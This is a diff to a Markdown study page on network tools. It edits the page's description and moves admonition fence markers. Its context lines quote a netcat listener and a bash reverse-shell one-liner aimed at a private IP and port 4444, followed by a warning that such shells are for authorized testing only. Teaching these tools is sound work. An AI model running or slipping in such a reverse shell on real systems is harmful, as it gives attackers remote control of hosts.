@@ -1,8 +1,6 @@
 ---
 title: Network Tools
-description:
-  'Network Tools notes covering key definitions, core concepts, worked examples, and practice
-  questions for effective study and thorough revision.'
+description: 'Network troubleshooting is a systematic process of isolating and identifying the root cause of Connectivity, performance, or security issues. This section...'
 tags:
   - Networking
 categories:
@@ -166,7 +164,6 @@ Do not assume a host is down just because ping fails. Many networks block ICMP a
 `nc -zv` or `curl` to test TCP connectivity as an alternative. ICMP blocking is common in cloud
 Environments (AWS security groups do not allow ICMP by default).
 
-:::
 
 ## traceroute / traceroute6
 
@@ -500,12 +497,12 @@ nc -lvnp 4444
 bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
 ```
 
+:::
 :::danger
 
 Reverse shells and bind shells should only be used in authorized security testing environments.
 Using them without authorization is illegal.
 
-:::
 
 ## curl
 
@@ -1080,3 +1077,5 @@ for mastery of this topic.
 Worked examples demonstrating the application of key concepts are covered in the detailed sub-pages
 linked above.
 
+
+:::
